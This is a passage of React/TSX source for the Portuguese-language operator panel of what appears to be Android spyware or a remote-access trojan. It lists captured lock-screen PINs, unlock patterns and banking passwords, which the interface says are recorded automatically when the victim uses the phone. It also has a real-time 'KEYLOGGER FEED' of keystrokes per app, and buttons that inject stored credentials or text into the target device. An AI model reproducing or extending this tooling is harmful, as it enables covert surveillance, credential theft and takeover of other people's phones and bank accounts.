                  disabled={!quickPinInput.trim() || isUsingCredId === "new_pin_exec"}
                  style={{
                    background: "rgba(34, 197, 94, 0.2)",
                    border: "1px solid #22c55e",
                    color: "#86efac",
                    borderRadius: "4px",
                    fontSize: "9.5px",
                    fontWeight: 800,
                    padding: "6px 9px",
                    cursor: quickPinInput.trim() ? "pointer" : "not-allowed",
                    display: "flex",
                    alignItems: "center",
                    gap: "4px",
                    whiteSpace: "nowrap"
                  }}
                >
                  <Play size={10} className={isUsingCredId === "new_pin_exec" ? "animate-spin" : ""} />
                  <span>{isUsingCredId === "new_pin_exec" ? "Digitando..." : "Digitar & Gravar"}</span>
                </button>
              </div>
            )}
          </div>

          {/* Form to Add New Credential (PIN, Pattern, Password, Biometric) */}
          {isAddingCred && (
            <div
              style={{
                background: "#0c0f18",
                border: "1px solid #38bdf8",
                borderRadius: "8px",
                padding: "10px",
                display: "flex",
                flexDirection: "column",
                gap: "8px"
              }}
            >
              <div style={{ fontSize: "11px", fontWeight: 800, color: "#38bdf8", display: "flex", alignItems: "center", gap: "5px" }}>
                <Key size={13} />
                <span>Gravar Nova Senha / Autenticação</span>
              </div>

              {/* Selector de Tipo */}
              <div style={{ display: "grid", gridTemplateColumns: "repeat(5, 1fr)", gap: "4px" }}>
                {[
                  { id: "pin", label: "PIN", icon: Hash },
                  { id: "pattern", label: "Padrão", icon: Grid },
                  { id: "password", label: "Senha", icon: Key },
                  { id: "fingerprint", label: "Digital", icon: Fingerprint },
                  { id: "face", label: "Facial", icon: ScanFace }
                ].map((t) => {
                  const Icon = t.icon;
                  const isSel = newCredType === t.id;
                  return (
                    <button
                      key={t.id}
                      type="button"
                      onClick={() => setNewCredType(t.id as DeviceCredentialType)}
                      style={{
                        background: isSel ? "rgba(56, 189, 248, 0.2)" : "#131826",
                        border: `1px solid ${isSel ? "#38bdf8" : "#1e293b"}`,
                        borderRadius: "4px",
                        color: isSel ? "#38bdf8" : "#94a3b8",
                        fontSize: "9.5px",
                        fontWeight: 700,
                        padding: "5px 2px",
                        cursor: "pointer",
                        display: "flex",
                        flexDirection: "column",
                        alignItems: "center",
                        gap: "2px"
                      }}
                    >
                      <Icon size={12} />
                      <span>{t.label}</span>
                    </button>
                  );
                })}
              </div>

              {/* Inputs */}
              <div>
                <label style={{ fontSize: "9.5px", color: "#94a3b8", display: "block", marginBottom: "2px" }}>
                  Nome / Identificação:
                </label>
                <input
                  type="text"
                  placeholder="Ex: PIN Tela Bloqueio, Senha Nubank..."
                  value={newCredLabel}
                  onChange={(e) => setNewCredLabel(e.target.value)}
                  style={{
                    width: "100%",
                    background: "#080c14",
                    border: "1px solid #1e293b",
                    borderRadius: "4px",
                    padding: "5px 8px",
                    fontSize: "11px",
                    color: "#fff",
                    boxSizing: "border-box"
                  }}
                />
              </div>

              <div>
                <label style={{ fontSize: "9.5px", color: "#94a3b8", display: "block", marginBottom: "2px" }}>
                  Aplicativo / Contexto:
                </label>
                <input
                  type="text"
                  placeholder="Ex: Tela de Bloqueio, Banco do Brasil..."
                  value={newCredApp}
                  onChange={(e) => setNewCredApp(e.target.value)}
                  style={{
                    width: "100%",
                    background: "#080c14",
                    border: "1px solid #1e293b",
                    borderRadius: "4px",
                    padding: "5px 8px",
                    fontSize: "11px",
                    color: "#fff",
                    boxSizing: "border-box"
                  }}
                />
              </div>

              {/* Special Value Input depending on type */}
              {newCredType === "pattern" ? (
                <div>
                  <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "4px" }}>
                    <label style={{ fontSize: "9.5px", color: "#94a3b8" }}>
                      Desenhe o Padrão (Clique nos pontos em sequência):
                    </label>
                    <button
                      type="button"
                      onClick={handlePatternClear}
                      style={{ background: "transparent", border: "none", color: "#ef4444", fontSize: "9.5px", cursor: "pointer" }}
                    >
                      Limpar
                    </button>
                  </div>
                  <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
                    <MiniPatternGrid
                      points={newPatternPoints}
                      size={90}
                      interactive={true}
                      onPointClick={handlePatternPointClick}
                    />
                    <div style={{ flex: 1, fontSize: "10px", color: "#94a3b8", lineHeight: 1.4 }}>
                      <div>Sequência:</div>
                      <div style={{ color: "#00e5ff", fontWeight: 800, fontFamily: "var(--font-mono)" }}>
                        {newPatternPoints.length > 0 ? newPatternPoints.map((p) => p + 1).join(" → ") : "Nenhum ponto"}
                      </div>
                      <div style={{ fontSize: "8.5px", color: "#64748b", marginTop: "4px" }}>
                        Clique nos pontos na ordem desejada.
                      </div>
                    </div>
                  </div>
                </div>
              ) : newCredType === "pin" ? (
                <div>
                  <label style={{ fontSize: "9.5px", color: "#94a3b8", display: "block", marginBottom: "2px" }}>
                    Dígitos do PIN (Numérico):
                  </label>
                  <input
                    type="text"
                    inputMode="numeric"
                    placeholder="Ex: 1234 ou 123456"
                    value={newCredValue}
                    onChange={(e) => setNewCredValue(e.target.value.replace(/\D/g, ""))}
                    style={{
                      width: "100%",
                      background: "#080c14",
                      border: "1px solid #1e293b",
                      borderRadius: "4px",
                      padding: "5px 8px",
                      fontSize: "11px",
                      color: "#fff",
                      fontFamily: "var(--font-mono)",
                      boxSizing: "border-box"
                    }}
                  />
                </div>
              ) : newCredType === "password" ? (
                <div>
                  <label style={{ fontSize: "9.5px", color: "#94a3b8", display: "block", marginBottom: "2px" }}>
                    Senha Alfanumérica:
                  </label>
                  <input
                    type="text"
                    placeholder="Digite a senha..."
                    value={newCredValue}
                    onChange={(e) => setNewCredValue(e.target.value)}
                    style={{
                      width: "100%",
                      background: "#080c14",
                      border: "1px solid #1e293b",
                      borderRadius: "4px",
                      padding: "5px 8px",
                      fontSize: "11px",
                      color: "#fff",
                      boxSizing: "border-box"
                    }}
                  />
                </div>
              ) : (
                <div style={{ fontSize: "10px", color: "#94a3b8", background: "#060911", padding: "6px 8px", borderRadius: "4px" }}>
                  Sensor de biometria será mapeado com ID padrão (1) e ficará salvo para injeção automática.
                </div>
              )}

              {/* Botão de Salvar */}
              <button
                type="button"
                onClick={handleSaveNewCredential}
                style={{
                  background: "var(--crimson-neon, #ff1a2a)",
                  border: "none",
                  borderRadius: "4px",
                  color: "#fff",
                  fontSize: "10.5px",
                  fontWeight: 800,
                  padding: "6px",
                  cursor: "pointer",
                  marginTop: "4px"
                }}
              >
                Salvar Credencial no Cofre
              </button>
            </div>
          )}

          {/* Filter Pills */}
          <div style={{ display: "flex", gap: "4px", overflowX: "auto", paddingBottom: "2px" }}>
            {[
              { id: "todas", label: `Todas (${credentials.length})` },
              { id: "fingerprint", label: "Digital" },
              { id: "face", label: "Facial" },
              { id: "pin", label: "PIN" },
              { id: "pattern", label: "Padrão" },
              { id: "password", label: "Senhas" }
            ].map((f) => (
              <button
                key={f.id}
                type="button"
                onClick={() => setSelectedCredFilter(f.id)}
                style={{
                  background: selectedCredFilter === f.id ? "rgba(56, 189, 248, 0.2)" : "#0c0f18",
                  border: `1px solid ${selectedCredFilter === f.id ? "#38bdf8" : "#1e293b"}`,
                  borderRadius: "4px",
                  color: selectedCredFilter === f.id ? "#38bdf8" : "#94a3b8",
                  fontSize: "9.5px",
                  fontWeight: 700,
                  padding: "3px 7px",
                  cursor: "pointer",
                  whiteSpace: "nowrap"
                }}
              >
                {f.label}
              </button>
            ))}
          </div>

          {/* Lista de Credenciais Salvas */}
          <div style={{ display: "flex", flexDirection: "column", gap: "6px" }}>
            {filteredCredentials.length === 0 ? (
              <div
                style={{
                  textAlign: "center",
                  padding: "24px 14px",
                  background: "rgba(12, 15, 26, 0.7)",
                  border: "1px dashed #1e293b",
                  borderRadius: "8px",
                  display: "flex",
                  flexDirection: "column",
                  alignItems: "center",
                  gap: "6px"
                }}
              >
                <Lock size={22} style={{ color: "#64748b" }} />
                <div style={{ fontSize: "11px", fontWeight: 700, color: "#cbd5e1" }}>
                  Nenhum Padrão ou Senha em Cache
                </div>
                <div style={{ fontSize: "9px", color: "#64748b", maxWidth: "260px", lineHeight: "1.4" }}>
                  Os padrões e credenciais aparecerão e serão gravados automaticamente assim que forem utilizados no aparelho.
                </div>
              </div>
            ) : (
              filteredCredentials.map((cred) => {
                const isRevealed = revealedCredIds.has(cred.id);
                const isPattern = cred.type === "pattern";
                const patternPoints =
                  cred.metadata?.patternPoints ||
                  cred.value.split(",").map(Number).filter((n) => !isNaN(n));
                const isProcessing = isUsingCredId === cred.id;

                const typeColor =
                  cred.type === "fingerprint"
                    ? "#a855f7"
                    : cred.type === "face"
                    ? "#00e5ff"
                    : cred.type === "pin"
                    ? "#f59e0b"
                    : cred.type === "pattern"
                    ? "#38bdf8"
                    : "#22c55e";

                const TypeIcon =
                  cred.type === "fingerprint"
                    ? Fingerprint
                    : cred.type === "face"
                    ? ScanFace
                    : cred.type === "pin"
                    ? Hash
                    : cred.type === "pattern"
                    ? Grid
                    : Key;

                return (
                  <div
                    key={cred.id}
                    style={{
                      background: "#0c0f18",
                      border: `1px solid ${isProcessing ? "#00e5ff" : "#1e293b"}`,
                      borderRadius: "6px",
                      padding: "8px 10px",
                      display: "flex",
                      flexDirection: "column",
                      gap: "6px",
                      transition: "all 0.15s ease"
                    }}
                  >
                    {/* Header: Type icon, Label, App, and Delete button */}
                    <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                      <div style={{ display: "flex", alignItems: "center", gap: "6px", minWidth: 0 }}>
                        <div
                          style={{
                            width: "22px",
                            height: "22px",
                            borderRadius: "4px",
                            background: `${typeColor}22`,
                            border: `1px solid ${typeColor}55`,
                            display: "flex",
                            alignItems: "center",
                            justifyContent: "center",
                            flexShrink: 0
                          }}
                        >
                          <TypeIcon size={12} style={{ color: typeColor }} />
                        </div>
                        <div style={{ minWidth: 0 }}>
                          <div
                            style={{
                              fontSize: "11px",
                              fontWeight: 800,
                              color: "#f8fafc",
                              overflow: "hidden",
                              textOverflow: "ellipsis",
                              whiteSpace: "nowrap"
                            }}
                          >
                            {cred.label}
                          </div>
                          {cred.metadata?.appName && (
                            <div style={{ fontSize: "9px", color: "#64748b" }}>
                              {cred.metadata.appName}
                            </div>
                          )}
                        </div>
                      </div>

                      <div style={{ display: "flex", alignItems: "center", gap: "4px" }}>
                        <button
                          type="button"
                          onClick={() => handleDeleteCredential(cred.id)}
                          style={{
                            background: "transparent",
                            border: "none",
                            color: "#64748b",
                            cursor: "pointer",
                            padding: "2px"
                          }}
                          title="Remover credencial"
                        >
                          <Trash2 size={11} />
                        </button>
                      </div>
                    </div>

                    {/* Middle: Value / Mask / Pattern Viewer */}
                    <div
                      style={{
                        background: "#070a12",
                        border: "1px solid #161d2d",
                        borderRadius: "5px",
                        padding: "5px 8px",
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "space-between",
                        gap: "6px"
                      }}
                    >
                      {isPattern ? (
                        <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
                          <MiniPatternGrid points={patternPoints} size={36} />
                          <div style={{ fontSize: "9.5px", color: "#38bdf8", fontFamily: "var(--font-mono)" }}>
                            Padrão: {patternPoints.map((p) => p + 1).join(" → ")}
                          </div>
                        </div>
                      ) : cred.type === "fingerprint" ? (
                        <div style={{ fontSize: "9.5px", color: "#d8b4fe" }}>
                          Sensor ID 1 · Impressão Digital Mapeada
                        </div>
                      ) : cred.type === "face" ? (
                        <div style={{ fontSize: "9.5px", color: "#67e8f9" }}>
                          Face Unlock · Reconhecimento Facial Mapeado
                        </div>
                      ) : (
                        <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
                          <span
                            style={{
                              fontSize: "11px",
                              fontFamily: "var(--font-mono)",
                              color: "#fff",
                              letterSpacing: isRevealed ? "normal" : "2px"
                            }}
                          >
                            {isRevealed ? cred.value : "••••••••"}
                          </span>
                          <button
                            type="button"
                            onClick={() => toggleRevealCred(cred.id)}
                            style={{
                              background: "transparent",
                              border: "none",
                              color: "#64748b",
                              cursor: "pointer",
                              padding: "1px"
                            }}
                            title={isRevealed ? "Ocultar" : "Mostrar"}
                          >
                            {isRevealed ? <EyeOff size={11} /> : <Eye size={11} />}
                          </button>
                          <button
                            type="button"
                            onClick={() => {
                              navigator.clipboard.writeText(cred.value);
                              showToast("Copiado!", "success");
                            }}
                            style={{
                              background: "transparent",
                              border: "none",
                              color: "#64748b",
                              cursor: "pointer",
                              padding: "1px"
                            }}
                            title="Copiar valor"
                          >
                            <Copy size={11} />
                          </button>
                        </div>
                      )}

                      {/* Action button: USAR NO APARELHO */}
                      <button
                        type="button"
                        onClick={() => handleUseCredential(cred)}
                        disabled={isProcessing}
                        style={{
                          background: isProcessing ? "rgba(0, 229, 255, 0.25)" : "rgba(34, 197, 94, 0.15)",
                          border: `1px solid ${isProcessing ? "#00e5ff" : "#22c55e"}`,
                          borderRadius: "4px",
                          color: isProcessing ? "#00e5ff" : "#86efac",
                          fontSize: "10px",
                          fontWeight: 700,
                          padding: "3px 8px",
                          cursor: "pointer",
                          display: "flex",
                          alignItems: "center",
                          gap: "4px"
                        }}
                        title="Injetar e usar credencial no celular"
                      >
                        <Play size={10} className={isProcessing ? "animate-spin" : ""} />
                        <span>{isProcessing ? "Injetando..." : "Usar no Aparelho"}</span>
                      </button>
                    </div>
                  </div>
                );
              })
            )}
          </div>
        </div>
      )}

      {/* SESSÃO 2: DIGITAÇÃO & TECLAS EM TEMPO REAL (KEYLOGGER FEED) */}
      {(senhasSubTab === "teclas" || senhasSubTab === "split") && (
        <div style={{ display: "flex", flexDirection: "column", flex: 1, borderTop: senhasSubTab === "split" ? "2px solid #1e293b" : "none" }}>
          {/* Categories Filter Tabs */}
          <div style={{ display: "flex", borderBottom: "1px solid #1a2233", background: "#0b0f19", padding: "4px 8px", gap: "4px", overflowX: "auto" }}>
            {categories.map((cat) => (
              <button
                key={cat.id}
                type="button"
                onClick={() => setSelectedCategory(cat.id)}
                style={{
                  background: selectedCategory === cat.id ? "var(--crimson-neon, #ff1a2a)" : "transparent",
                  color: selectedCategory === cat.id ? "#fff" : "#94a3b8",
                  border: "none",
                  borderRadius: "4px",
                  padding: "3px 8px",
                  fontSize: "10.5px",
                  fontWeight: 700,
                  cursor: "pointer",
                  whiteSpace: "nowrap"
                }}
              >
                {cat.label}
              </button>
            ))}
          </div>

          {/* Search & Actions Bar */}
          <div style={{ display: "flex", alignItems: "center", gap: "6px", padding: "8px 10px", background: "#080a12", borderBottom: "1px solid #1a2233" }}>
            <div style={{ position: "relative", flex: 1 }}>
              <Search size={12} style={{ position: "absolute", left: "8px", top: "50%", transform: "translateY(-50%)", color: "#64748b" }} />
              <input
                type="text"
                placeholder="Filtrar digitação..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                style={{
                  width: "100%",
                  background: "#0d111c",
                  border: "1px solid #1e293b",
                  borderRadius: "5px",
                  padding: "4px 8px 4px 26px",
                  fontSize: "10.5px",
                  color: "#cbd5e1",
                  outline: "none"
                }}
              />
            </div>
            <button
              type="button"
              onClick={fetchLogs}
              title="Atualizar Logs"
              style={{ background: "#0d111c", border: "1px solid #1e293b", color: "#94a3b8", borderRadius: "5px", padding: "4px 6px", cursor: "pointer" }}
            >
              <RefreshCw size={12} className={isRefreshing ? "animate-spin" : ""} />
            </button>
            <button
              type="button"
              onClick={handleCopyAll}
              title="Copiar todos os registros visíveis"
              style={{ background: "#0d111c", border: "1px solid #1e293b", color: "#94a3b8", borderRadius: "5px", padding: "4px 6px", cursor: "pointer" }}
            >
              <Copy size={12} />
            </button>
            <button
              type="button"
              onClick={handleClearLogs}
              title="Limpar histórico"
              style={{ background: "#0d111c", border: "1px solid #1e293b", color: "#ef4444", borderRadius: "5px", padding: "4px 6px", cursor: "pointer" }}
            >
              <Trash2 size={12} />
            </button>
          </div>

          {/* Log Stream Body */}
          <div style={{ flex: 1, overflowY: "auto", padding: "8px 10px", display: "flex", flexDirection: "column", gap: "6px" }}>
            {filteredLogs.length === 0 ? (
              <div style={{ margin: "auto", textAlign: "center", color: "#64748b", padding: "24px 10px" }}>
                <Keyboard size={24} style={{ opacity: 0.4, marginBottom: "8px" }} />
                <div style={{ fontSize: "11px", fontWeight: 700 }}>Nenhuma digitação registrada nesta categoria.</div>
                <div style={{ fontSize: "10px", marginTop: "4px" }}>As teclas digitadas nos aplicativos aparecem aqui em tempo real.</div>
              </div>
            ) : (
              filteredLogs.map((item) => (
                <div
                  key={item.id}
                  style={{
                    background: "#0c0f18",
                    border: "1px solid #1a2233",
                    borderRadius: "6px",
                    padding: "8px 10px",
                    display: "flex",
                    flexDirection: "column",
                    gap: "4px",
                    transition: "border-color 0.15s ease"
                  }}
                >
                  <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                    <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
                      <AppLogo name={item.appName} packageName={item.packageName} size={14} />
                      <span style={{ fontSize: "10.5px", fontWeight: 700, color: "#f8fafc" }}>
                        {item.appName}
                      </span>
                      {item.contextTag && (
                        <span style={{ fontSize: "9px", background: "rgba(56, 189, 248, 0.15)", color: "#38bdf8", padding: "1px 4px", borderRadius: "3px" }}>
                          {item.contextTag}
                        </span>
                      )}
                    </div>
                    <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
                      <span style={{ fontSize: "9.5px", color: "#64748b", fontFamily: "var(--font-mono)" }}>
                        {item.timestamp}
                      </span>
                      <button
                        type="button"
                        onClick={() => handleCopy(item.content, item.id)}
                        title="Copiar texto"
                        style={{
                          background: "transparent",
                          border: "none",
                          color: copiedId === item.id ? "#22c55e" : "#64748b",
                          cursor: "pointer",
                          padding: "1px 3px"
                        }}
                      >
                        {copiedId === item.id ? <Check size={11} /> : <Copy size={11} />}
                      </button>
                    </div>
                  </div>

                  <div
                    style={{
                      fontSize: "11.5px",
                      color: "#cbd5e1",
                      background: "#070910",
                      padding: "6px 8px",
                      borderRadius: "4px",
                      border: "1px solid #141a29",
                      fontFamily: "var(--font-mono)",
                      wordBreak: "break-word"
                    }}
                  >
                    {item.content}
                  </div>
                </div>
              ))
            )}
          </div>

          {/* Quick Direct Keystroke Sender at Footer */}
          <form
            onSubmit={handleSendText}
            style={{
              padding: "8px 10px",
              background: "#080a12",
              borderTop: "1px solid #1a2233",
              display: "flex",
              gap: "6px"
            }}
          >
            <input
              type="text"
              placeholder="Digitar texto no aparelho..."
              value={quickInput}
              onChange={(e) => setQuickInput(e.target.value)}
              style={{
                flex: 1,
                background: "#0d111c",
                border: "1px solid #1e293b",
                borderRadius: "5px",
                padding: "6px 10px",
                fontSize: "11px",
                color: "#cbd5e1",
                outline: "none"
              }}
            />
            <button
              type="submit"
              disabled={isSending || !quickInput.trim()}
              style={{
                background: "var(--crimson-neon, #ff1a2a)",
                border: "none",
                borderRadius: "5px",
                color: "#fff",
                padding: "6px 10px",
                cursor: quickInput.trim() ? "pointer" : "default",
                opacity: quickInput.trim() ? 1 : 0.5,
                display: "flex",
                alignItems: "center",
                justifyContent: "center"
              }}
              title="Injetar texto no celular"
            >
              <Send size={13} />
            </button>
          </form>
        </div>
      )}
    </div>
  )}
</aside>
  );
}
